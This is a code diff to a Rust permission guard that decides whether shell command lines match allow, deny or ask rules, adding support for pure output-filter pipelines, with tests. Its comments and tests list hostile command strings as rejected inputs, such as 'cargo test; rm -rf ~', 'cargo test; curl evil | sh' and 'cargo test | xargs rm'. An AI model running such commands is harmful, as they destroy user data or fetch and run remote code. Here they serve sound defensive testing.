@@ -6,7 +6,8 @@
 //!
 //! - **An `allow` rule with a `command` glob never matches a command line that chains,
 //!   substitutes or redirects**, so `cargo *` allows `cargo test` and does not allow
-//!   `cargo test 2>&1 | tail`, which asks instead. See "Commands" for why and for the exact set.
+//!   `cargo test; rm -rf ~`, which asks instead. The one exception is a *pure output filter
+//!   pipeline* such as `cargo test 2>&1 | tail -40`, matched as `cargo test`. See "Commands".
 //! - A `deny` or `ask` rule with a `command` glob also matches when any one simple command inside
 //!   a chain matches, so a chain cannot hide a denied command.
 //! - `/**` means "outside the run's worktree", judged lexically, with no symlink resolution and no
@@ -67,8 +68,29 @@
 //!   denies `true; rm -rf /`.
 //! - An `allow` rule never matches a line that chains, substitutes or redirects: one that
 //!   contains any of `; & | ( ) < >`, a backtick, `$(` or a newline. `cargo *` allows
-//!   `cargo test` and not `cargo test; curl evil | sh`, nor `cargo test 2>&1 | tail`; those
-//!   lines fall through to the next rule, and to the policy default if none matches.
+//!   `cargo test` and not `cargo test; curl evil | sh`; those lines fall through to the next
+//!   rule, and to the policy default if none matches. **Except** for a pure output filter
+//!   pipeline, below.
+//!
+//! ## Pure output filter pipelines (allow rules only)
+//!
+//! A line of the shape `X [2>&1 | 2>/dev/null] | F1 | F2 ...` is matched as `X` alone, when
+//! every `Fi` is a pure text filter from a fixed list with only the options listed for it, and
+//! `X` is itself a simple command. The list is `head`, `tail`, `grep`, `rg`, `wc`, `sort`,
+//! `uniq`, `cut`, `tr`, `cat` and `sed -n`; none may take a file operand, `-f`/`--file`,
+//! `sort -o`/`--output`/`--compress-program`, `rg --pre`/`-z`, `tail -f`, or (for `sed`) a
+//! `w`, `W`, `e`, `r`, `R` or block command. `awk` is not on the list. The only redirection
+//! is the trailing `2>&1` or `2>/dev/null` on `X`. So `cargo *` allows
+//! `cargo test --workspace 2>&1 | grep -n -A6 "panicked" | head -30`, and not any of
+//! `cargo test | sh`, `cargo test | tee x`, `cargo test | xargs rm`, `cargo test | sort -o f`,
+//! `cargo test > out.txt`, `cargo test; rm -rf ~`, `cargo test && x`, `cargo test | tail $(x)`.
+//!
+//! An environment prefix is **not** stripped: `FOO=1 cargo test | tail` is matched as written
+//! (so `cargo *` does not match it), because variables such as `RUSTC`, `PATH` or
+//! `LD_PRELOAD` change which program runs. Standing rules read pipelines the same way (an exact
+//! rule for `cargo test` allows `cargo test 2>&1 | tail`). `deny` and `ask` rules are
+//! unchanged: they still match any simple command in any stage. The exact grammar, the
+//! per-filter option lists and the rejected forms are in `pipeline.rs`.
 //!
 //! This is a guard, not a shell parser. A quoted `;` is treated as a break, which can make a
 //! deny rule match more and an allow rule match less than the shell would, never the reverse.
@@ -82,6 +104,7 @@ use std::path::{Component, Path, PathBuf};
 use globset::{Glob, GlobBuilder, GlobMatcher};
 use serde::Serialize;
 
+use super::pipeline::pure_pipeline_head;
 use super::{PolicyDef, PolicyEffect, PolicyRule, RuleScope};
 use crate::exec::ApprovalSubject;
 
@@ -220,7 +243,7 @@ pub(crate) fn command_holds(effect: PolicyEffect, glob: &str, line: &str) -> boo
         return false;
     };
     match effect {
-        PolicyEffect::Allow => !chains_or_redirects(line) && glob.is_match(line),
+        PolicyEffect::Allow => allow_matches(&glob, line),
         PolicyEffect::Deny | PolicyEffect::Ask => {
             glob.is_match(line)
                 || line
@@ -232,7 +255,15 @@ pub(crate) fn command_holds(effect: PolicyEffect, glob: &str, line: &str) -> boo
     }
 }
 
-fn chains_or_redirects(line: &str) -> bool {
+/// An `allow` glob holds a simple command, or a pure pipeline whose first command it holds.
+fn allow_matches(glob: &GlobMatcher, line: &str) -> bool {
+    if !chains_or_redirects(line) {
+        return glob.is_match(line);
+    }
+    pure_pipeline_head(line).is_some_and(|command| glob.is_match(command))
+}
+
+pub(super) fn chains_or_redirects(line: &str) -> bool {
     line.contains(['<', '>']) || line.contains(COMMAND_BREAKS) || line.contains("$(")
 }
 
@@ -783,7 +814,6 @@ mod tests {
             "cargo test $(id)",
             "cargo test > /etc/x",
             "cargo test < /etc/x",
-            "cargo test 2>&1 | tail",
             "cargo test (echo x)",
             "(cargo test)",
         ] {
@@ -793,6 +823,70 @@ mod tests {
                 "{line:?}"
             );
         }
+    }
+
+    #[test]
+    fn a_pure_output_filter_pipeline_is_matched_as_its_command() {
+        let p = policy(
+            r#"
+            default = "ask"
+            [[rules]]
+            note = "cargo"
+            effect = "allow"
+            match = { action = "command", command = "cargo *" }
+            "#,
+        );
+        for line in [
+            "cargo test 2>&1 | tail -40",
+            "cargo update 2>&1 | tail -50",
+            "cargo test --workspace 2>&1 | grep -n -A6 \"panicked\" | head -30",
+            "cargo test 2>/dev/null | wc -l",
+            "cargo test | sort | uniq -c | head",
+            "cargo test 2>&1 | sed -n '1,20p'",
+        ] {
+            assert_eq!(
+                named(&eval(&p, None, &command(line))),
+                ("allow", "cargo"),
+                "{line:?}"
+            );
+        }
+        for line in [
+            "cargo test | sh",
+            "cargo test; rm -rf ~",
+            "cargo test > out.txt",
+            "cargo test | tee x",
+            "cargo test | xargs rm",
+            "cargo test | sort -o f",
+            "cargo test | awk '{print}'",
+            "cargo test 2>&1 | tail > out",
+            "cargo test 2>out | tail",
+            "FOO=1 cargo test | tail",
+            "cargo test 2>&1 | tail && rm x",
+            "cargo test | cat file",
+        ] {
+            assert_eq!(
+                named(&eval(&p, None, &command(line))),
+                ("ask", DEFAULT_RULE),
+                "{line:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_deny_still_reaches_every_stage_of_a_pipeline() {
+        let p = policy(
+            r#"
+            default = "allow"
+            [[rules]]
+            note = "no sh"
+            effect = "deny"
+            match = { action = "command", command = "sh*" }
+            "#,
+        );
+        assert_eq!(
+            named(&eval(&p, None, &command("cargo test 2>&1 | sh"))).0,
+            "deny"
+        );
     }
 
     #[test]
